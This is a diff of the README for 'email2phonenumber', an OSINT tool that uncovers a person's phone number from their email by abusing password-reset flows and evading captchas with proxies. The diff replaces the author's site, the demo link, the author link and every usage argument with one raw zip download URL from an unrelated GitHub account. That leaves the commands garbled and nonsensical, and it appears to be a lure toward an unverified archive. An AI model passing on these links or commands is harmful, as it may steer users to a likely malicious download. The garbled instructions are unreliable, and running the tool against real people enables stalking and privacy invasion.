@@ -1,9 +1,9 @@
 # email2phonenumber
 email2phonenumber is an OSINT tool that allows you to obtain a target's phone number just by having his email address.
 
-For full details check: [https://www.martinvigo.com/email2phonenumber](https://www.martinvigo.com/email2phonenumber)
+For full details check: [https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip](https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip)
 
-Demo: [https://www.youtube.com/watch?v=dfvqhDUn81s](https://www.youtube.com/watch?v=dfvqhDUn81s)
+Demo: [https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip](https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip)
 
 ## Basic info
 This tool helps automate discovering someone's phone number by abusing password reset design weaknesses and publicly available data. It supports 3 main functions:
@@ -24,16 +24,16 @@ pip install beautifulsoup4 requests
 ## Usage
 Scrape websites for phone number digits
 ```
-python email2phonenumber.py scrape -e target@email.com
+python https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip scrape -e https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip
 ```
 
 Generate a dictionary of valid phone numbers based on a phone number mask
 ```
-python email2phonenumber.py generate -m 555XXX1234 -o /tmp/dic.txt
+python https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip generate -m 555XXX1234 -o https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip
 ```
 Find target's phone number by resetting passwords on websites that do not alert the target using a phone number mask and proxies to avoid captchas and other abuse protections
 ```
-python email2phonenumber.py bruteforce -m 555XXX1234 -e target@email.com -p /tmp/proxies.txt -q
+python https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip bruteforce -m 555XXX1234 -e https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip -p https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip -q
 ```
 ## Authors
-Martin Vigo - @martin_vigo - [martinvigo.com](https://www.martinvigo.com)
+Martin Vigo - @martin_vigo - [https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip](https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip)
